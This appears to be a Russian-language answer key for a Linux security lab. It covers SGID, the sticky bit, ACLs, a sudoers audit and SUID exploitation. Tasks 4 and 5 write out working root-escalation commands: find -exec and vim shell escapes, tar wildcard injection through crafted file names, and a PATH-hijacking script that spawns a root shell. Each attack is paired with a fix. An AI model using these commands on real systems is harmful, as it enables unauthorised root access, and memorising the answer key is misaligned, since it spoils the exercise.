# Решения и эталонные ответы: Лабораторная работа 02

---

## Задание 1: Каталог разработчиков с SGID

### 1. Установка владельцев и прав
```bash
sudo chown -R root:developers /tmp/corp_storage/projects
sudo chmod 2770 /tmp/corp_storage/projects
```
- Число `2` в позиции специальных прав (`2770`) включает бит **SGID** (Set Group ID).
- `770` дает полные права (`rwx`) владельцу и группе `developers`, и запрещает доступ (`---`) всем остальным.

### 2. Проверка работы
```bash
# Проверяем права на папку:
ls -ld /tmp/corp_storage/projects
# Вывод: drwxrws--- 2 root developers ...

# Создаем файл от имени dev_alice:
sudo -u dev_alice touch /tmp/corp_storage/projects/alice_feature.py
ls -l /tmp/corp_storage/projects/alice_feature.py
# Вывод: -rw-r--r-- 1 dev_alice developers ...
```
Обратите внимание: первичная группа `dev_alice` могла быть другой, но файл унаследовал группу каталога `developers`.

---

## Задание 2: Общедоступный каталог со Sticky Bit

### 1. Установка прав
```bash
sudo chmod 1777 /tmp/corp_storage/public_drop
```
- Число `1` задает **Sticky Bit** (`t`).
- `777` разрешает всем читать, писать и выполнять.
В выводе `ls -ld` отобразится: `drwxrwxrwt`.

### 2. Тестирование защиты от удаления
```bash
# Alice создает файл
sudo -u dev_alice touch /tmp/corp_storage/public_drop/alice_secret.txt

# Bob пытается удалить чужой файл
sudo -u dev_bob rm /tmp/corp_storage/public_drop/alice_secret.txt
# Вывод: rm: cannot remove '/tmp/corp_storage/public_drop/alice_secret.txt': Operation not permitted
```
Удаление заблокировано ядром благодаря Sticky bit.

---

## Задание 3: POSIX ACL для auditor_charlie

### 1. Установка базовых и наследуемых (default) ACL
```bash
# 1. Права на существующий каталог:
sudo setfacl -m u:auditor_charlie:r-x /tmp/corp_storage/projects

# 2. Наследование на все будущие файлы и папки (-d = default):
sudo setfacl -d -m u:auditor_charlie:r-x /tmp/corp_storage/projects
```

### 2. Проверка
```bash
getfacl /tmp/corp_storage/projects
```
Вывод:
```text
# file: tmp/corp_storage/projects
# owner: root
# group: developers
# flags: -s-
user::rwx
user:auditor_charlie:r-x
group::rwx
mask::rwx
other::---
default:user::rwx
default:user:auditor_charlie:r-x
default:group::rwx
default:mask::rwx
default:other::---
```

---

## Задание 4: Аудит sudoers и GTFOBins

### 1. Анализ уязвимостей (Векторы побега в root-шелл)

1. **`junior_admin ALL=(root) NOPASSWD: /usr/bin/find`**
   - **Уязвимость**: Утилита `find` имеет встроенный флаг `-exec`, позволяющий выполнить произвольную команду от имени того, кто запустил `find`.
   - **Эксплойт**:
     ```bash
     sudo find . -exec /bin/bash \; -quit
     # или
     sudo find . -exec /bin/sh \;
     ```
     Младший админ мгновенно оказывается в интерактивном root-шелле без пароля.

2. **`dev_alice ALL=(root) /usr/bin/vim /etc/nginx/sites-available/project.conf`**
   - **Уязвимость**: Даже если указан конкретный файл, текстовый редактор `vim` позволяет выполнять системные команды из командного режима `:!`.
   - **Эксплойт**:
     Внутри vim ввести:
     ```text
     :!/bin/bash
     # или
     :set shell=/bin/bash
     :shell
     ```
     Пользователь получает root-шелл, так как vim был запущен через `sudo`.

3. **`backup_user ALL=(root) NOPASSWD: /usr/bin/tar -czf *`**
   - **Уязвимость**: Использование подстановочного знака `*` (wildcard) и флага `checkpoint-action` в утилите GNU tar.
   - **Эксплойт**:
     ```bash
     # Создаются файлы-флаги в текущей директории:
     touch -- "--checkpoint=1"
     touch -- "--checkpoint-action=exec=sh exploit.sh"
     sudo tar -czf backup.tar.gz *
     ```
     Утилита `tar` воспримет имена файлов как аргументы командной строки и выполнит `exploit.sh` от имени root!

### 2. Безопасные альтернативы
- **Для find**: Не давать sudo на бинарник `find`. Если нужно искать файлы по системе, использовать скрипт-обертку со строгим белым списком аргументов, либо дать доступ на чтение каталогов через ACL.
- **Для vim**: Для безопасного редактирования системных файлов предназначена утилита `sudoedit` (или `sudo -e`):
  ```sudoers
  dev_alice ALL=(root) sudoedit /etc/nginx/sites-available/project.conf
  ```
  `sudoedit` создает временную копию файла с правами пользователя, открывает редактор от имени **обычного пользователя** (побег даст шелл самого пользователя, а не root), а после сохранения копирует изменения обратно от имени root.
- **Для tar**: Запретить использование `*` в аргументах sudoers. Оформить бекап в виде неизменяемого shell-скрипта (например, `/usr/local/bin/run_backup.sh`), принадлежащего `root:root` с правами `0700`, и разрешить в sudoers запуск только этого конкретного скрипта без аргументов.


---

## Задание 5: Эксплуатация SUID-бинарника через PATH Hijacking

### 1. Подготовка стенда
```bash
gcc -o /tmp/vuln_status starter_data/vuln_status.c
sudo chown root:root /tmp/vuln_status
sudo chmod 4755 /tmp/vuln_status
```

### 2. Реализация атаки PATH Hijacking
Программа вызывает `system("service --status-all")`. Так как путь к `service` относительный, библиотека glibc использует переменную окружения `PATH` вызывающего процесса.

Шаги атакующего:
```bash
# Создаем вредоносную утилиту 'service' в /tmp:
cat << 'EOF' > /tmp/service
#!/bin/bash
echo "[+] Эксплуатация PATH Hijacking успешна! Текущий UID: $(id)"
# Спавним интерактивный root-шелл:
/bin/bash -p
EOF

chmod +x /tmp/service

# Модифицируем PATH, помещая /tmp на первое место:
export PATH="/tmp:$PATH"

# Запускаем уязвимый SUID бинарник:
/tmp/vuln_status
```
Результат:
```text
[*] Запуск служебной проверки сетевых служб...
[+] Эксплуатация PATH Hijacking успешна! Текущий UID: uid=1000(student) euid=0(root) groups=0(root)...
root@linux-lab:/tmp#
```
Получен полноценный root-доступ с эффективным UID (euid) = 0!

### 3. Исправление уязвимости
В исходном коде на C:
1. Всегда указывать абсолютные пути ко всем системным утилитам: `/usr/sbin/service`.
2. Еще более надежно — использовать семейство функций `execve()` с явно переданным безопасным массивом переменных окружения (`char *const envp[] = {"PATH=/usr/bin:/bin", NULL};`), полностью игнорируя пользовательский `PATH`.
3. Сбрасывать привилегии (`setuid(getuid())`), если выполнение дочернего процесса не требует прав root.
